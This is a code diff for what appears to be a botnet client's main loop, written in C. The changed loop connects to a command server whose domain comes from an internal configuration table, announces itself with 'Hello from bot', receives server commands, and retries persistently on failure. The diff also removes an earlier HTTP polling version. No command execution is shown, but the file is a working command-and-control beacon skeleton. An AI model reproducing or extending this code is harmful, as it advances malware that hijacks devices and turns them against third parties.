@@ -10,52 +10,61 @@
 #include <sys/ioctl.h>
 #include <string.h>
 
-#include "http_client.h"
 #include "ram_mem.h"
 #include "utils.h"
+#include "receiver.h"
 
-#define RESPONSE_SIZE 8192
+#define RESPONSE_SIZE 4096
 
-int main(int argc, char **argv) {
+int main(void)
+{
+    dict_init();
 
     int client_fd;
     struct sockaddr_in server_address;
-    
-    dict_init();
+    char buffer[RESPONSE_SIZE];
+    const char *message = "Hello from bot";
 
-    //polling
-    while(1) {
-        if (connection_init(&client_fd, &server_address, dict_get(DICT_DOMAIN_NAME)) < 0) {
-            return 1;
+    while (1)
+    {
+        if (receiver_init(&client_fd, &server_address, dict_get(DICT_DOMAIN_NAME)) != 0)
+        {
+#ifdef DEBUG
+            printf("[main] Connection failed, retrying in 2 seconds...\n");
+#endif
+            sleep(2);
+            continue;
         }
 
-        char response[RESPONSE_SIZE];
-        
-        if(send_http_request(client_fd, dict_get(DICT_DOMAIN_NAME), "/polling") < 0) {
+        if (send(client_fd, message, strlen(message), 0) < 0)
+        {
+#ifdef DEBUG
+            perror("[main] Error: Sending data");
+#endif
             close(client_fd);
-            return 1;
+            sleep(2);
+            continue;
         }
 
-        if (recv_http_response(client_fd, response, RESPONSE_SIZE) > 0) {
+        ssize_t received = recv_server_command(client_fd, buffer, sizeof(buffer));
+        if (received < 0)
+        {
 #ifdef DEBUG
-            printf("\n[http] Server Response:\n%s\n", get_last_line((char *)response));
+            printf("[main] Connection lost, reconnecting...\n");
 #endif
+            close(client_fd);
+            sleep(2);
+            continue; 
         }
 
-        //command manager
-       
-        
 #ifdef DEBUG
-        sleep(2); // delay between requests (in seconds)
-#else
-        sleep(20);
+        printf("[main] Received from server: %s\n", buffer);
 #endif
 
+        close(client_fd);
+        sleep(2); 
     }
 
-    
-    close(client_fd);
     dict_free();
     return 0;
 }
-
